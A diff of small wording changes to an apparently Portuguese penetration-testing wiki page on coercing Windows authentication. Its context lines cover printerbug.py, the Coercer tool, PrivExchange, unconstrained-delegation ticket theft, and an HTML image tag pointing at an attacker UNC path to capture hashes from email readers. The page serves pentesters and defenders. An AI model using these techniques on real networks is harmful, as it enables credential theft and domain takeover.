@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Combinando com Delegação Não Restrita
 
-Se um atacante já comprometeu um computador com [Delegação Não Restrita](unconstrained-delegation.md), o atacante pode **fazer a impressora se autenticar contra este computador**. Devido à delegação não restrita, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação não restrita. Como o atacante já comprometeu este host, ele poderá **recuperar este ticket** e abusar dele ([Pass the Ticket](pass-the-ticket.md)).
+Se um atacante já comprometeu um computador com [Delegação Não Restrita](unconstrained-delegation.md), o atacante poderia **fazer a impressora se autenticar contra este computador**. Devido à delegação não restrita, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação não restrita. Como o atacante já comprometeu este host, ele poderá **recuperar este ticket** e abusar dele ([Pass the Ticket](pass-the-ticket.md)).
 
 ## Autenticação Forçada RCP
 
@@ -51,9 +51,9 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-O ataque `PrivExchange` é resultado de uma falha encontrada na **funcionalidade `PushSubscription` do Exchange Server**. Esta funcionalidade permite que o servidor Exchange seja forçado por qualquer usuário de domínio com uma caixa de correio a se autenticar em qualquer host fornecido pelo cliente via HTTP.
+O ataque `PrivExchange` é o resultado de uma falha encontrada no **recurso `PushSubscription` do Exchange Server**. Este recurso permite que o servidor Exchange seja forçado por qualquer usuário de domínio com uma caixa de correio a se autenticar em qualquer host fornecido pelo cliente via HTTP.
 
-Por padrão, o **serviço Exchange é executado como SYSTEM** e recebe privilégios excessivos (especificamente, possui **privilégios WriteDacl na atualização cumulativa do domínio anterior a 2019**). Esta falha pode ser explorada para permitir o **encaminhamento de informações para o LDAP e, subsequentemente, extrair o banco de dados NTDS do domínio**. Em casos onde o encaminhamento para o LDAP não é possível, esta falha ainda pode ser usada para encaminhar e autenticar em outros hosts dentro do domínio. A exploração bem-sucedida deste ataque concede acesso imediato ao Administrador de Domínio com qualquer conta de usuário de domínio autenticada.
+Por padrão, o **serviço Exchange é executado como SYSTEM** e recebe privilégios excessivos (especificamente, possui **privilégios WriteDacl na atualização cumulativa do domínio anterior a 2019**). Essa falha pode ser explorada para permitir o **encaminhamento de informações para o LDAP e, subsequentemente, extrair o banco de dados NTDS do domínio**. Em casos onde o encaminhamento para o LDAP não é possível, essa falha ainda pode ser usada para encaminhar e autenticar em outros hosts dentro do domínio. A exploração bem-sucedida deste ataque concede acesso imediato ao Admin do Domínio com qualquer conta de usuário autenticada do domínio.
 
 ## Dentro do Windows
 
@@ -94,7 +94,7 @@ Se você souber o **endereço de email** do usuário que faz login em uma máqui
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-e quando ele abrir, ele tentará se autenticar.
+e quando ele o abrir, ele tentará se autenticar.
 
 ### MitM
 
